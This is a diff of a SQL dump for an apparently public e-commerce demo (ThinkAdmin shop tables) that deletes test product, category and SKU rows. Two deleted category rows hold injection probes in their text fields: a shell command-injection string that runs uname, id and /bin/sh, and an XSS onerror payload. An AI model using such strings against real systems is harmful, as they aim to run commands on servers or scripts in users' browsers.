-INSERT INTO `shop_goods` VALUES (12, 33, 'G7122345603086', '测试商品不发货6', ',777,555,444,444,', 'https://v6.thinkadmin.top/upload/01/8aa3984216c4bfcee22a37ffcd0a24.jpg', 'https://v6.thinkadmin.top/upload/01/8aa3984216c4bfcee22a37ffcd0a24.jpg|https://v6.thinkadmin.top/upload/a3/4513def733dc02ca1d377fee953c23.jpg', '', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/01/8aa3984216c4bfcee22a37ffcd0a24.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/a3/4513def733dc02ca1d377fee953c23.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/a3/4513def733dc02ca1d377fee953c23.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色\",\"sku\":\"S71018527222\",\"status\":false,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性2\",\"sku\":\"S71018527290\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性3\",\"sku\":\"S71018527437\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}]]', 'T2021011976356', 0, 0, 0, 15, 99.00, 100.00, 2, 1, 2, 2, 0, 0, 0, 0, 0, 1, 0, '2021-02-02 10:56:01');
-INSERT INTO `shop_goods` VALUES (13, 33, 'G7137603957250', '测试', ',777,555,444,444,', 'https://v6.thinkadmin.top/upload/81/ec72497bc750b1d90232f034dbf0bf.jpg', 'https://v6.thinkadmin.top/upload/81/ec72497bc750b1d90232f034dbf0bf.jpg|https://v6.thinkadmin.top/upload/ca/41292b2262116f698e016ffb1190de.jpg', '1144', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/ca/41292b2262116f698e016ffb1190de.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/81/ec72497bc750b1d90232f034dbf0bf.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"默认分组\",\"list\":[{\"name\":\"默认规格\",\"check\":true,\"show\":true,\"group\":\"默认分组\"}]}]', '[[{\"name\":\"默认规格\",\"check\":true,\"show\":true,\"group\":\"默认分组\",\"key\":\"默认分组::默认规格\",\"sku\":\"S7137603953297\",\"status\":true,\"market\":\"3.00\",\"selling\":\"2.00\",\"express\":1,\"virtual\":100}]]', 'T2021020471541', 0, 0, 0, 100, 2.00, 3.00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, '2021-02-20 02:48:38');
-INSERT INTO `shop_goods` VALUES (14, 33, 'G7138029504945', '测试商品不发货2', ',777,555,444,444,', 'https://v6.thinkadmin.top/upload/28/77a4f8cfed8bd48adcdc6192628e13.jpg', 'https://v6.thinkadmin.top/upload/28/77a4f8cfed8bd48adcdc6192628e13.jpg|https://v6.thinkadmin.top/upload/98/9180a5126a41d6acc110c8cc163e97.jpg', '', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/a6/48a3f96c963488297f9b08236de799.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色\",\"sku\":\"S71018527222\",\"status\":false,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性2\",\"sku\":\"S71018527290\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性3\",\"sku\":\"S71018527437\",\"status\":true,\"market\":\"100.00\",\"selling\":\"99.00\",\"express\":1,\"virtual\":5}]]', 'T2021011976356', 0, 0, 0, 15, 99.00, 100.00, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, '2021-02-20 14:35:50');
-INSERT INTO `shop_goods` VALUES (15, 37, 'G7140657326678', '测试规格哈', ',777,', 'https://v6.thinkadmin.top/upload/a6/48a3f96c963488297f9b08236de799.jpg', 'https://v6.thinkadmin.top/upload/a6/48a3f96c963488297f9b08236de799.jpg|https://v6.thinkadmin.top/upload/28/77a4f8cfed8bd48adcdc6192628e13.jpg', '测试规格哈', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/a6/48a3f96c963488297f9b08236de799.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/28/77a4f8cfed8bd48adcdc6192628e13.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"红色\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]},{\"name\":\"尺寸\",\"list\":[{\"name\":\"150\",\"check\":true,\"show\":true,\"group\":\"尺寸\"},{\"name\":\"130\",\"check\":true,\"show\":true,\"group\":\"尺寸\"},{\"name\":\"300\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色;;尺寸::150\",\"sku\":\"S7140657870839\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"52.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":10},{\"name\":\"150\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色;;尺寸::130\",\"sku\":\"S7140657918647\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"64.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":20},{\"name\":\"130\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色;;尺寸::300\",\"sku\":\"S7140657958510\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"77.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":4},{\"name\":\"300\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::白色;;尺寸::150\",\"sku\":\"S71406578726610\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"65.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":5},{\"name\":\"150\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::白色;;尺寸::130\",\"sku\":\"S7140657916753\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"95.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":7},{\"name\":\"130\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::白色;;尺寸::300\",\"sku\":\"S7140657957296\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"75.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":8},{\"name\":\"300\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"红色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::红色;;尺寸::150\",\"sku\":\"S7140657872786\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"96.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":0},{\"name\":\"150\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"红色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::红色;;尺寸::130\",\"sku\":\"S7140657917545\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"45.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":1},{\"name\":\"130\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"红色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::红色;;尺寸::300\",\"sku\":\"S7140657959821\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"99.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":0},{\"name\":\"300\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}]]', 'T2021022055462', 0, 900, 0, 55, 45.00, 100.00, 0, 0, 0, 0, 0, 169, 0, 0, 4, 1, 0, '2021-02-23 15:39:24');
-INSERT INTO `shop_goods` VALUES (16, 37, 'G7140731152507', '测试规格哈2', ',777,', 'https://v6.thinkadmin.top/upload/a6/48a3f96c963488297f9b08236de799.jpg', 'https://v6.thinkadmin.top/upload/a6/48a3f96c963488297f9b08236de799.jpg|https://v6.thinkadmin.top/upload/28/77a4f8cfed8bd48adcdc6192628e13.jpg', '测试规格哈', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/a6/48a3f96c963488297f9b08236de799.jpg\" style=\"max-width:100%;border:0\" /></span><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/28/77a4f8cfed8bd48adcdc6192628e13.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"红色\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]},{\"name\":\"尺寸\",\"list\":[{\"name\":\"150\",\"check\":true,\"show\":true,\"group\":\"尺寸\"},{\"name\":\"130\",\"check\":true,\"show\":true,\"group\":\"尺寸\"},{\"name\":\"300\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色;;尺寸::150\",\"sku\":\"S7140657870839\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"52.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":10},{\"name\":\"150\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色;;尺寸::130\",\"sku\":\"S7140657918647\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"64.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":20},{\"name\":\"130\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色;;尺寸::300\",\"sku\":\"S7140657958510\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"77.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":4},{\"name\":\"300\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::白色;;尺寸::150\",\"sku\":\"S71406578726610\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"65.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":5},{\"name\":\"150\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::白色;;尺寸::130\",\"sku\":\"S7140657916753\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"95.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":7},{\"name\":\"130\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"白色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::白色;;尺寸::300\",\"sku\":\"S7140657957296\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"75.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":8},{\"name\":\"300\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"红色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::红色;;尺寸::150\",\"sku\":\"S7140657872786\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"96.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":0},{\"name\":\"150\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"红色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::红色;;尺寸::130\",\"sku\":\"S7140657917545\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"45.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":1},{\"name\":\"130\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}],[{\"name\":\"红色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::红色;;尺寸::300\",\"sku\":\"S7140657959821\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"99.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":0},{\"name\":\"300\",\"check\":true,\"show\":true,\"group\":\"尺寸\"}]]', 'T2021022055462', 0, 45, 0, 55, 45.00, 100.00, 0, 0, 0, 0, 0, 74, 0, 0, 5, 1, 0, '2021-02-23 17:38:35');
-INSERT INTO `shop_goods` VALUES (17, 37, 'G7141314710092', '测试商品不发货2', ',,', 'https://v6.thinkadmin.top/upload/72/8980f7f7b90825a34b92e77699101c.jpg', 'https://v6.thinkadmin.top/upload/f1/ec5468a1c88f1299c8ac61488483a2.jpg', '', '<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/0b/41ddc2fe3395af9c8de51282b70e87.jpg\" style=\"max-width:100%;border:0\" /></span></p>', '[{\"name\":\"颜色\",\"list\":[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\"},{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\"}]}]', '[[{\"name\":\"黑色\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::黑色\",\"sku\":\"S71018527222\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"99.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性2\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性2\",\"sku\":\"S71018527290\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"99.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":5}],[{\"name\":\"规格属性3\",\"check\":true,\"show\":true,\"group\":\"颜色\",\"key\":\"颜色::规格属性3\",\"sku\":\"S71018527437\",\"status\":true,\"market\":\"100.00\",\"balance\":\"0.00\",\"selling\":\"99.00\",\"integral\":\"0.00\",\"express\":1,\"virtual\":5}]]', '', 0, 0, 0, 0, 99.00, 100.00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, '2021-02-24 09:51:11');
 
 -- ----------------------------
 -- Table structure for shop_goods_cate
@@ -640,49 +480,11 @@ CREATE TABLE `shop_goods_cate`  (
   INDEX `idx_shop_goods_cate_sort`(`sort`) USING BTREE,
   INDEX `idx_shop_goods_cate_status`(`status`) USING BTREE,
   INDEX `idx_shop_goods_cate_deleted`(`deleted`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 39 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-商品-分类' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-商品-分类' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of shop_goods_cate
 -- ----------------------------
-INSERT INTO `shop_goods_cate` VALUES (1, 0, 'asd', 'https://v6.thinkadmin.top/upload/ca/3ce2c8b168cdf6eb78d475cdf5d4ad.png', 'asd', 0, 1, 1, '2021-01-08 14:27:32');
-INSERT INTO `shop_goods_cate` VALUES (2, 0, '后视镜', 'https://v6.thinkadmin.top/upload/36/9bafafc4d0abb77edfba640db47038.png', '', 0, 1, 1, '2021-01-09 03:17:28');
-INSERT INTO `shop_goods_cate` VALUES (3, 2, '小圆镜', '', '', 5, 1, 1, '2021-01-09 03:17:41');
-INSERT INTO `shop_goods_cate` VALUES (4, 3, '32', '', '', 0, 1, 1, '2021-01-12 10:58:01');
-INSERT INTO `shop_goods_cate` VALUES (5, 0, '测试', '测试', '测试', 0, 1, 1, '2021-01-12 11:11:24');
-INSERT INTO `shop_goods_cate` VALUES (6, 0, '手表', '', '', 0, 1, 1, '2021-01-13 08:16:25');
-INSERT INTO `shop_goods_cate` VALUES (7, 6, '腕表', 'https://xs.sb/LNv6', '', 0, 1, 1, '2021-01-14 17:04:56');
-INSERT INTO `shop_goods_cate` VALUES (8, 6, '\'echo \"`uname -a`\";echo \"`id`\";/bin/sh\'', '\'echo \"`uname -a`\";echo \"`id`\";/bin/sh\'', '\'echo \"`uname -a`\";echo \"`id`\";/bin/sh\'', 0, 1, 1, '2021-01-14 17:05:42');
-INSERT INTO `shop_goods_cate` VALUES (9, 0, '家电', '', '', 0, 1, 1, '2021-01-14 17:05:52');
-INSERT INTO `shop_goods_cate` VALUES (10, 9, '电脑', '', '', 0, 1, 1, '2021-01-14 17:06:00');
-INSERT INTO `shop_goods_cate` VALUES (11, 9, '电视', 'https://v6.thinkadmin.top/upload/af/8306f060499b4b76a072bc13cb0492.png', '', 0, 1, 1, '2021-01-14 20:40:48');
-INSERT INTO `shop_goods_cate` VALUES (12, 10, '测试', '', '', 0, 1, 1, '2021-01-15 16:04:46');
-INSERT INTO `shop_goods_cate` VALUES (13, 10, 'cpu', '', '', 0, 1, 1, '2021-01-15 17:23:41');
-INSERT INTO `shop_goods_cate` VALUES (14, 6, '<img src=x onerror=alert(137) ~2F>', '<img src=x onerror=alert(137) ~2F>', '<img src=x onerror=alert(137) ~2F>', 0, 1, 1, '2021-01-21 01:07:17');
-INSERT INTO `shop_goods_cate` VALUES (15, 7, '11111', '', '', 0, 1, 1, '2021-01-21 11:25:33');
-INSERT INTO `shop_goods_cate` VALUES (16, 7, '22222', '', '', 0, 1, 1, '2021-01-21 11:57:52');
-INSERT INTO `shop_goods_cate` VALUES (17, 8, '11111', '', '', 0, 1, 1, '2021-01-21 11:57:56');
-INSERT INTO `shop_goods_cate` VALUES (18, 8, '22222', '', '', 0, 1, 1, '2021-01-21 11:58:05');
-INSERT INTO `shop_goods_cate` VALUES (19, 0, '一级', 'https://v6.thinkadmin.top/upload/67/80ec1461e5158804a8292d8afa7a6b.png', '', 11, 1, 1, '2021-01-25 17:32:20');
-INSERT INTO `shop_goods_cate` VALUES (20, 19, '二级', '', '', 0, 1, 1, '2021-01-25 17:32:28');
-INSERT INTO `shop_goods_cate` VALUES (21, 20, '三级', '', '', 0, 1, 1, '2021-01-25 17:32:36');
-INSERT INTO `shop_goods_cate` VALUES (22, 20, '12312', '', '', 0, 1, 1, '2021-01-27 16:02:14');
-INSERT INTO `shop_goods_cate` VALUES (23, 19, '123123', '', '', 0, 1, 1, '2021-01-27 16:03:25');
-INSERT INTO `shop_goods_cate` VALUES (24, 20, '123123', '', '', 0, 1, 1, '2021-01-27 16:03:34');
-INSERT INTO `shop_goods_cate` VALUES (25, 0, '123', '', '', 0, 1, 1, '2021-01-29 15:36:58');
-INSERT INTO `shop_goods_cate` VALUES (26, 25, '456', '', '', 0, 1, 1, '2021-01-29 15:37:09');
-INSERT INTO `shop_goods_cate` VALUES (27, 26, '789', '', '', 0, 1, 1, '2021-01-29 15:37:27');
-INSERT INTO `shop_goods_cate` VALUES (28, 0, 'test', '', '', 0, 1, 1, '2021-01-30 15:18:48');
-INSERT INTO `shop_goods_cate` VALUES (29, 28, 'test2', '', '', 0, 1, 1, '2021-01-30 15:19:03');
-INSERT INTO `shop_goods_cate` VALUES (30, 0, '测试', '', '', 0, 1, 1, '2021-02-03 17:01:51');
-INSERT INTO `shop_goods_cate` VALUES (31, 0, '测试1', '', '', 0, 1, 0, '2021-02-03 18:19:18');
-INSERT INTO `shop_goods_cate` VALUES (32, 31, '测试2', '', '', 0, 1, 0, '2021-02-03 18:19:23');
-INSERT INTO `shop_goods_cate` VALUES (33, 32, '测试3', '', '', 0, 1, 0, '2021-02-03 18:19:30');
-INSERT INTO `shop_goods_cate` VALUES (34, 0, 'TEST1', '', '', 0, 1, 0, '2021-02-18 03:10:01');
-INSERT INTO `shop_goods_cate` VALUES (35, 31, '333', '333', '', 3, 1, 0, '2021-02-20 22:44:19');
-INSERT INTO `shop_goods_cate` VALUES (36, 35, '3334', '44', '', 2, 1, 0, '2021-02-20 22:44:32');
-INSERT INTO `shop_goods_cate` VALUES (37, 35, '4444', '', '', 4, 1, 0, '2021-02-20 22:45:18');
-INSERT INTO `shop_goods_cate` VALUES (38, 0, '123321', '111', '', 0, 1, 0, '2021-02-24 01:07:19');
 
 -- ----------------------------
 -- Table structure for shop_goods_item
@@ -707,81 +509,11 @@ CREATE TABLE `shop_goods_item`  (
   INDEX `index_store_goods_item_code`(`goods_code`) USING BTREE,
   INDEX `index_store_goods_item_spec`(`goods_spec`) USING BTREE,
   INDEX `index_store_goods_item_status`(`status`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 71 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '商城-商品-规格' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '商城-商品-规格' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of shop_goods_item
 -- ----------------------------
-INSERT INTO `shop_goods_item` VALUES (1, 'S71018527222', 'G7101852191255', '颜色::黑色', 0, 336, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-09 17:42:20');
-INSERT INTO `shop_goods_item` VALUES (2, 'S71018527290', 'G7101852191255', '颜色::规格属性2', 0, 100, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-09 17:42:20');
-INSERT INTO `shop_goods_item` VALUES (3, 'S71018527437', 'G7101852191255', '颜色::规格属性3', 1, 100, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-09 17:42:20');
-INSERT INTO `shop_goods_item` VALUES (4, 'S71061733218', 'G7106171904105', '颜色::白色;;内存::68;;类型::阉割版', 0, 1234, 66.00, 99.00, 0, 1, 0.00, 0.00, 1, '2021-01-14 17:43:50');
-INSERT INTO `shop_goods_item` VALUES (5, 'S71061734476', 'G7106171904105', '颜色::白色;;内存::68;;类型::正常班', 0, 212, 66.00, 99.00, 0, 1, 0.00, 0.00, 1, '2021-01-14 17:43:50');
-INSERT INTO `shop_goods_item` VALUES (6, 'S71061735172', 'G7106171904105', '颜色::白色;;内存::68;;类型::加强版', 0, 22, 66.00, 99.00, 0, 1, 0.00, 0.00, 1, '2021-01-14 17:43:50');
-INSERT INTO `shop_goods_item` VALUES (7, 'S71061733211', 'G7106171904105', '颜色::白色;;内存::125;;类型::阉割版', 0, 33, 66.00, 99.00, 0, 1, 0.00, 0.00, 1, '2021-01-14 17:43:50');
-INSERT INTO `shop_goods_item` VALUES (8, 'S71061734417', 'G7106171904105', '颜色::白色;;内存::125;;类型::正常班', 0, 444, 66.00, 99.00, 0, 1, 0.00, 0.00, 1, '2021-01-14 17:43:50');
-INSERT INTO `shop_goods_item` VALUES (9, 'S71061735191', 'G7106171904105', '颜色::白色;;内存::125;;类型::加强版', 0, 555, 66.00, 99.00, 0, 1, 0.00, 0.00, 1, '2021-01-14 17:43:50');
-INSERT INTO `shop_goods_item` VALUES (10, 'S71061733284', 'G7106171904105', '颜色::黑色;;内存::68;;类型::阉割版', 0, 66, 66.00, 99.00, 0, 1, 0.00, 0.00, 1, '2021-01-14 17:43:50');
-INSERT INTO `shop_goods_item` VALUES (11, 'S71061734439', 'G7106171904105', '颜色::黑色;;内存::68;;类型::正常班', 0, 77, 66.00, 99.00, 0, 1, 0.00, 0.00, 1, '2021-01-14 17:43:50');
-INSERT INTO `shop_goods_item` VALUES (12, 'S71061735184', 'G7106171904105', '颜色::黑色;;内存::68;;类型::加强版', 0, 7877, 66.00, 99.00, 0, 1, 0.00, 0.00, 1, '2021-01-14 17:43:50');
-INSERT INTO `shop_goods_item` VALUES (13, 'S71061733269', 'G7106171904105', '颜色::黑色;;内存::125;;类型::阉割版', 0, 88, 66.00, 99.00, 0, 1, 0.00, 0.00, 1, '2021-01-14 17:43:50');
-INSERT INTO `shop_goods_item` VALUES (14, 'S71061734428', 'G7106171904105', '颜色::黑色;;内存::125;;类型::正常班', 0, 77, 66.00, 99.00, 0, 1, 0.00, 0.00, 1, '2021-01-14 17:43:50');
-INSERT INTO `shop_goods_item` VALUES (15, 'S71061735183', 'G7106171904105', '颜色::黑色;;内存::125;;类型::加强版', 0, 0, 66.00, 99.00, 0, 1, 0.00, 0.00, 0, '2021-01-14 17:43:50');
-INSERT INTO `shop_goods_item` VALUES (16, 'S71018527222', 'G7110723823961', '颜色::黑色', 0, 999, 39.00, 56.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 00:06:22');
-INSERT INTO `shop_goods_item` VALUES (17, 'S71018527290', 'G7110723823961', '颜色::规格属性2', 0, 999, 39.00, 56.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 00:06:22');
-INSERT INTO `shop_goods_item` VALUES (18, 'S71018527437', 'G7110723823961', '颜色::规格属性3', 0, 999, 39.00, 56.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 00:06:22');
-INSERT INTO `shop_goods_item` VALUES (19, 'S71018527222', 'G7111527334335', '颜色::黑色', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:25:33');
-INSERT INTO `shop_goods_item` VALUES (20, 'S71018527290', 'G7111527334335', '颜色::规格属性2', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:25:33');
-INSERT INTO `shop_goods_item` VALUES (21, 'S71018527437', 'G7111527334335', '颜色::规格属性3', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:25:33');
-INSERT INTO `shop_goods_item` VALUES (22, 'S71018527222', 'G7111527421908', '颜色::黑色', 0, 10, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:25:42');
-INSERT INTO `shop_goods_item` VALUES (23, 'S71018527290', 'G7111527421908', '颜色::规格属性2', 0, 20, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:25:42');
-INSERT INTO `shop_goods_item` VALUES (24, 'S71018527437', 'G7111527421908', '颜色::规格属性3', 0, 30, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:25:42');
-INSERT INTO `shop_goods_item` VALUES (25, 'S71018527222', 'G7111527534526', '颜色::黑色', 0, 1101, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:25:53');
-INSERT INTO `shop_goods_item` VALUES (26, 'S71018527290', 'G7111527534526', '颜色::规格属性2', 0, 120, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:25:53');
-INSERT INTO `shop_goods_item` VALUES (27, 'S71018527437', 'G7111527534526', '颜色::规格属性3', 0, 1600, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:25:53');
-INSERT INTO `shop_goods_item` VALUES (28, 'S71018527222', 'G7111527940393', '颜色::黑色', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:26:34');
-INSERT INTO `shop_goods_item` VALUES (29, 'S71018527290', 'G7111527940393', '颜色::规格属性2', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:26:34');
-INSERT INTO `shop_goods_item` VALUES (30, 'S71018527437', 'G7111527940393', '颜色::规格属性3', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:26:34');
